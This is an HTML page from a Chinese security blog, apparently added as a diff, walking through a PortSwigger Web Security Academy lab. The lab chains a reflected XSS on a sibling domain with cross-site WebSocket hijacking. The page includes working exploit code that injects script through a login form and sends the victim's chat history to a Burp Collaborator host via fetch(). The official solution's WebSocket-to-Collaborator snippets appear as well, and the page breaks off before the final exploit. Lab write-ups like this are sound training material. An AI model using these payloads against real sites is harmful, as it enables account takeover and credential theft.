@@ -1,0 +1,399 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css" integrity="sha256-5eIC48iZUHmSlSUz9XtjRyK2mzQkHScZY1WdMaoz74E=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"secdroid.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.21.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="0x01. PortSwigger Web Security AcademyPortSwigger Web Security Academy 是 Burp Suite 官方推出的免费 Web 安全学习靶场，在学习 Web 安全知识的同时，还可以练习 Burp Suite 的实战技能。 本篇文章讲解 Web Security Academy 之中的跨站请求伪造（CSRF，Cross-site req">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Burp Web Academy CSRF 跨站请求伪造（二）">
+<meta property="og:url" content="https://secdroid.github.io/2025/05/28/burp-web-academy-csrf-cross-site-request-forgery-part2/index.html">
+<meta property="og:site_name" content="SecDroid">
+<meta property="og:description" content="0x01. PortSwigger Web Security AcademyPortSwigger Web Security Academy 是 Burp Suite 官方推出的免费 Web 安全学习靶场，在学习 Web 安全知识的同时，还可以练习 Burp Suite 的实战技能。 本篇文章讲解 Web Security Academy 之中的跨站请求伪造（CSRF，Cross-site req">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-05-28T14:00:30.432Z">
+<meta property="article:modified_time" content="2025-05-28T14:00:23.000Z">
+<meta property="article:author" content="Livermore">
+<meta property="article:tag" content="Burp">
+<meta property="article:tag" content="CSRF">
+<meta property="article:tag" content="WebSocket">
+<meta property="article:tag" content="XSS">
+<meta property="article:tag" content="Burp Collaborator">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://secdroid.github.io/2025/05/28/burp-web-academy-csrf-cross-site-request-forgery-part2/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://secdroid.github.io/2025/05/28/burp-web-academy-csrf-cross-site-request-forgery-part2/","path":"2025/05/28/burp-web-academy-csrf-cross-site-request-forgery-part2/","title":"Burp Web Academy CSRF 跨站请求伪造（二）"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Burp Web Academy CSRF 跨站请求伪造（二） | SecDroid</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">SecDroid</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">A security researcher who's looking for a job</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-links"><a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>链接</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-PortSwigger-Web-Security-Academy"><span class="nav-number">1.</span> <span class="nav-text">0x01. PortSwigger Web Security Academy</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-Lab-SameSite-Strict-bypass-via-sibling-domain"><span class="nav-number">2.</span> <span class="nav-text">0x02. Lab: SameSite Strict bypass via sibling domain</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E5%AE%98%E6%96%B9%E8%A7%A3%E7%AD%94%E5%AF%B9%E6%AF%94"><span class="nav-number">3.</span> <span class="nav-text">0x03. 官方解答对比</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-%E5%B0%8F%E7%BB%93"><span class="nav-number">4.</span> <span class="nav-text">0x04. 小结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-%E5%8F%82%E8%80%83%E6%96%87%E6%A1%A3"><span class="nav-number">5.</span> <span class="nav-text">0x05. 参考文档</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Livermore</p>
+  <div class="site-description" itemprop="description">SecDroid's Diary</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">38</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">53</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://secdroid.github.io/2025/05/28/burp-web-academy-csrf-cross-site-request-forgery-part2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Livermore">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="SecDroid">
+      <meta itemprop="description" content="SecDroid's Diary">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Burp Web Academy CSRF 跨站请求伪造（二） | SecDroid">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Burp Web Academy CSRF 跨站请求伪造（二）
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2025-05-28 22:00:30 / 修改时间：22:00:23" itemprop="dateCreated datePublished" datetime="2025-05-28T22:00:30+08:00">2025-05-28</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Vulnerability/" itemprop="url" rel="index"><span itemprop="name">Vulnerability</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Vulnerability/Web/" itemprop="url" rel="index"><span itemprop="name">Web</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Vulnerability/Web/Burp-Web-Academy/" itemprop="url" rel="index"><span itemprop="name">Burp Web Academy</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="0x01-PortSwigger-Web-Security-Academy"><a href="#0x01-PortSwigger-Web-Security-Academy" class="headerlink" title="0x01. PortSwigger Web Security Academy"></a>0x01. PortSwigger Web Security Academy</h2><p>PortSwigger Web Security Academy 是 <a href="https://secdroid.github.io/tags/Burp/">Burp</a> Suite 官方推出的免费 Web 安全学习靶场，在学习 Web 安全知识的同时，还可以练习 Burp Suite 的实战技能。</p>
+<p>本篇文章讲解 <a href="https://secdroid.github.io/categories/Vulnerability/Web/Burp-Web-Academy/">Web Security Academy</a> 之中的跨站请求伪造（CSRF，Cross-site request forgery）章节。</p>
+<span id="more"></span>
+
+<ul>
+<li><a href="https://secdroid.github.io/2025/02/12/burp-web-academy-csrf-cross-site-request-forgery/">Burp Web Academy CSRF 跨站请求伪造（一）</a></li>
+<li><a href="https://secdroid.github.io/2025/05/28/burp-web-academy-csrf-cross-site-request-forgery-part2/">Burp Web Academy CSRF 跨站请求伪造（二）</a></li>
+</ul>
+<h2 id="0x02-Lab-SameSite-Strict-bypass-via-sibling-domain"><a href="#0x02-Lab-SameSite-Strict-bypass-via-sibling-domain" class="headerlink" title="0x02. Lab: SameSite Strict bypass via sibling domain"></a>0x02. Lab: SameSite Strict bypass via sibling domain</h2><blockquote>
+<p>This lab’s live chat feature is vulnerable to cross-site WebSocket hijacking (CSWSH). To solve the lab, log in to the victim’s account.</p>
+<p>To do this, use the provided exploit server to perform a CSWSH attack that exfiltrates the victim’s chat history to the default Burp Collaborator server. The chat history contains the login credentials in plain text.</p>
+<p>If you haven’t done so already, we recommend completing our topic on <a target="_blank" rel="noopener" href="https://portswigger.net/web-security/websockets">WebSocket vulnerabilities</a> before attempting this lab.</p>
+</blockquote>
+<p>访问 <code>/chat</code> 页面，发现加载了 <code>/resources/js/chat.js</code>：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/resources/js/chat.js</span> <span class="meta">HTTP/2</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>0ad9005d03a6581d800617b4003a0037.web-security-academy.net</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=sbTM1nNRF9jCUVgLAECwBRmrvFDvVg5C</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>https://0ad9005d03a6581d800617b4003a0037.web-security-academy.net/chat</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br></pre></td></tr></table></figure>
+
+<p>在响应头中，设置了 <code>Access-Control-Allow-Origin</code>，允许 <code>https://cms-0ad9005d03a6581d800617b4003a0037.web-security-academy.net</code> 跨域访问。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/2</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/javascript; charset=utf-8</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>public, max-age=3600</span><br><span class="line"><span class="attribute">Access-Control-Allow-Origin</span><span class="punctuation">: </span>https://cms-0ad9005d03a6581d800617b4003a0037.web-security-academy.net</span><br><span class="line"><span class="attribute">X-Frame-Options</span><span class="punctuation">: </span>SAMEORIGIN</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>3561</span><br></pre></td></tr></table></figure>
+
+<p>打开 <code>https://cms-0ad9005d03a6581d800617b4003a0037.web-security-academy.net</code>，发现是一个登录页面，会回显用户名，此处存在 <a href="https://secdroid.github.io/2025/02/23/burp-web-academy-xss-cross-site-scripting/">XSS 漏洞</a>。那么，我们可以通过该页面的 XSS 发起 CSWSH 攻击（Cross-Site WebSocket Hijacking），泄露聊天记录。</p>
+<p>💡<strong>注意</strong></p>
+<ol>
+<li>有没有 WebSocket 跨站劫持攻击，可以直接写个 JavaScript 脚本测试</li>
+<li>XSS 漏洞可以用来绕过 <code>SameSite=Strict</code> 限制</li>
+</ol>
+<p>先简单看下 <code>/resources/js/chat.js</code> 的代码：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> chatForm = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;chatForm&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> messageBox = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;message-box&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> webSocket = <span class="title function_">openWebSocket</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. 需要对象存在</span></span><br><span class="line">    messageBox.<span class="title function_">addEventListener</span>(<span class="string">&quot;keydown&quot;</span>, <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">        <span class="comment">// -------- cut --------</span></span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 需要对象存在</span></span><br><span class="line">    chatForm.<span class="title function_">addEventListener</span>(<span class="string">&quot;submit&quot;</span>, <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">        <span class="comment">// -------- cut --------</span></span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">writeMessage</span>(<span class="params">className, user, content</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> row = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;tr&quot;</span>);</span><br><span class="line">        row.<span class="property">className</span> = className</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> userCell = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;th&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> contentCell = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;td&quot;</span>);</span><br><span class="line">        userCell.<span class="property">innerHTML</span> = user;</span><br><span class="line">        contentCell.<span class="property">innerHTML</span> = (<span class="keyword">typeof</span> <span class="variable language_">window</span>.<span class="property">renderChatMessage</span> === <span class="string">&quot;function&quot;</span>) ? <span class="variable language_">window</span>.<span class="title function_">renderChatMessage</span>(content) : content;</span><br><span class="line"></span><br><span class="line">        row.<span class="title function_">appendChild</span>(userCell);</span><br><span class="line">        row.<span class="title function_">appendChild</span>(contentCell);</span><br><span class="line">        <span class="comment">// 3. 需要对象存在</span></span><br><span class="line">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;chat-area&quot;</span>).<span class="title function_">appendChild</span>(row);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// -------- cut --------</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">openWebSocket</span>(<span class="params"></span>) &#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (webSocket) &#123;</span><br><span class="line">                <span class="title function_">res</span>(webSocket);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 4. action 属性</span></span><br><span class="line">            <span class="keyword">let</span> newWebSocket = <span class="keyword">new</span> <span class="title class_">WebSocket</span>(chatForm.<span class="title function_">getAttribute</span>(<span class="string">&quot;action&quot;</span>));</span><br><span class="line"></span><br><span class="line">            newWebSocket.<span class="property">onopen</span> = <span class="keyword">function</span> (<span class="params">evt</span>) &#123;</span><br><span class="line">                <span class="title function_">writeMessage</span>(<span class="string">&quot;system&quot;</span>, <span class="string">&quot;System:&quot;</span>, <span class="string">&quot;No chat history on record&quot;</span>);</span><br><span class="line">                newWebSocket.<span class="title function_">send</span>(<span class="string">&quot;READY&quot;</span>);</span><br><span class="line">                <span class="title function_">res</span>(newWebSocket);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            newWebSocket.<span class="property">onmessage</span> = <span class="keyword">function</span> (<span class="params">evt</span>) &#123;</span><br><span class="line">                <span class="comment">// -------- cut --------</span></span><br><span class="line">                <span class="comment">// writeMessage 展示消息</span></span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            newWebSocket.<span class="property">onclose</span> = <span class="keyword">function</span> (<span class="params">evt</span>) &#123;</span><br><span class="line">                webSocket = <span class="literal">undefined</span>;</span><br><span class="line">                <span class="title function_">writeMessage</span>(<span class="string">&quot;message&quot;</span>, <span class="string">&quot;System:&quot;</span>, <span class="string">&quot;--- Disconnected ---&quot;</span>);</span><br><span class="line">            &#125;;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>
+
+<p>从中可以看出，要使得代码正常运行，需要确保页面中存在几个特定的元素。因此，加载 <code>/resources/js/chat.js</code> 之前需要确保这些元素已经准备好。</p>
+<p>此外，WebSocket 交互是异步的，需要确保 WebSocket 消息已经全部处理完毕之后，再尝试发送数据到 <a href="https://secdroid.github.io/tags/Burp-Collaborator/">Burp Collaborator</a>。同时，发送数据到 Burp Collaborator 时需要使用 <code>https</code> 协议，否则 <code>https</code> 页面会拒绝访问 <code>http</code> 资源。</p>
+<p>那么，怎么把聊天记录发送出来呢？我们可以把整个页面的 HTML 代码都发出来，通过 <code>document.documentElement.outerHTML</code> 引用。为了等待 WebSocket 消息处理完毕，我们可以使用 <code>setTimeout</code> 延时执行代码。</p>
+<p>最后，使用反引号，可以在 JavaScript 中定义多行字符串。而为了避免字符串中的 <code>&lt;/script&gt;</code> 导致 <code>&lt;script&gt;</code> 标签提前闭合，需要对 <code>/</code> 进行转移，写成 <code>&lt;\/script&gt;</code> 即可。</p>
+<p>完整的利用代码如下：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=<span class="attr">https</span>:<span class="comment">//cms-0ad9005d03a6581d800617b4003a0037.web-security-academy.net/login method=POST&gt;</span></span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span></span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span> /&gt;</span></span></span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">var payload = `&lt;script&gt;</span><br><span class="line">  var e = document.createElement(&#x27;table&#x27;);</span><br><span class="line">  e.setAttribute(&#x27;id&#x27;, &#x27;chat-area&#x27;);</span><br><span class="line">  document.body.appendChild(e);</span><br><span class="line">  e = document.createElement(&#x27;form&#x27;);</span><br><span class="line">  e.setAttribute(&#x27;id&#x27;, &#x27;chatForm&#x27;);</span><br><span class="line">  var wsurl = &#x27;wss://0ad9005d03a6581d800617b4003a0037.web-security-academy.net/chat&#x27;;</span><br><span class="line">  e.setAttribute(&#x27;action&#x27;, wsurl);</span><br><span class="line">  t = document.createElement(&#x27;textarea&#x27;);</span><br><span class="line">  t.setAttribute(&#x27;id&#x27;, &#x27;message-box&#x27;);</span><br><span class="line">  e.appendChild(t);</span><br><span class="line">  document.body.appendChild(e);</span><br><span class="line">&lt;\/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script src=&#x27;https://0ad9005d03a6581d800617b4003a0037.web-security-academy.net/resources/js/chat.js&#x27;&gt;</span><br><span class="line">&lt;\/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">function delayFunc() &#123;</span><br><span class="line">    fetch(&#x27;https://gh1n6kd1bhu4qqxk4pnaqyog47ayyomd.oastify.com&#x27;, &#123;</span><br><span class="line">        method: &#x27;POST&#x27;, mode: &#x27;no-cors&#x27;, body: document.documentElement.outerHTML</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line">setTimeout(delayFunc, 3000);</span><br><span class="line">&lt;\/script&gt;`;</span><br><span class="line"></span><br><span class="line">document.forms[0].elements[&quot;username&quot;].value = payload;</span><br><span class="line">document.forms[0].submit();</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x03-官方解答对比"><a href="#0x03-官方解答对比" class="headerlink" title="0x03. 官方解答对比"></a>0x03. 官方解答对比</h2><p>首先，测试 Cross-Site WebSocket Hijacking 漏洞是否存在。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> ws = <span class="keyword">new</span> <span class="title class_">WebSocket</span>(<span class="string">&#x27;wss://YOUR-LAB-ID.web-security-academy.net/chat&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    ws.<span class="property">onopen</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        ws.<span class="title function_">send</span>(<span class="string">&quot;READY&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;;</span></span><br><span class="line"><span class="language-javascript">    ws.<span class="property">onmessage</span> = <span class="keyword">function</span>(<span class="params">event</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">fetch</span>(<span class="string">&#x27;https://YOUR-COLLABORATOR-PAYLOAD.oastify.com&#x27;</span>, &#123;<span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>, <span class="attr">mode</span>: <span class="string">&#x27;no-cors&#x27;</span>, <span class="attr">body</span>: event.<span class="property">data</span>&#125;);</span></span><br><span class="line"><span class="language-javascript">    &#125;;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>其次，确认 <code>cms-</code> 域名的登录请求可以通过 <code>GET</code> 方法触发，因此也可以通过 <code>GET</code> 触发 XSS 漏洞。</p>
+<p>之后，准备利用 Payload 代码。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> ws = <span class="keyword">new</span> <span class="title class_">WebSocket</span>(<span class="string">&#x27;wss://YOUR-LAB-ID.web-security-academy.net/chat&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    ws.<span class="property">onopen</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        ws.<span class="title function_">send</span>(<span class="string">&quot;READY&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;;</span></span><br><span class="line"><span class="language-javascript">    ws.<span class="property">onmessage</span> = <span class="keyword">function</span>(<span class="params">event</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">fetch</span>(<span class="string">&#x27;https://YOUR-COLLABORATOR-PAYLOAD.oastify.com&#x27;</span>, &#123;<span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>, <span class="attr">mode</span>: <span class="string">&#x27;no-cors&#x27;</span>, <span class="attr">body</span>: event.<span class="property">data</span>&#125;);</span></span><br><span class="line"><span class="language-javascript">    &#125;;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>最后，对 Payload 进行 URL 编码，然后构造如下漏洞利用代码：</p>
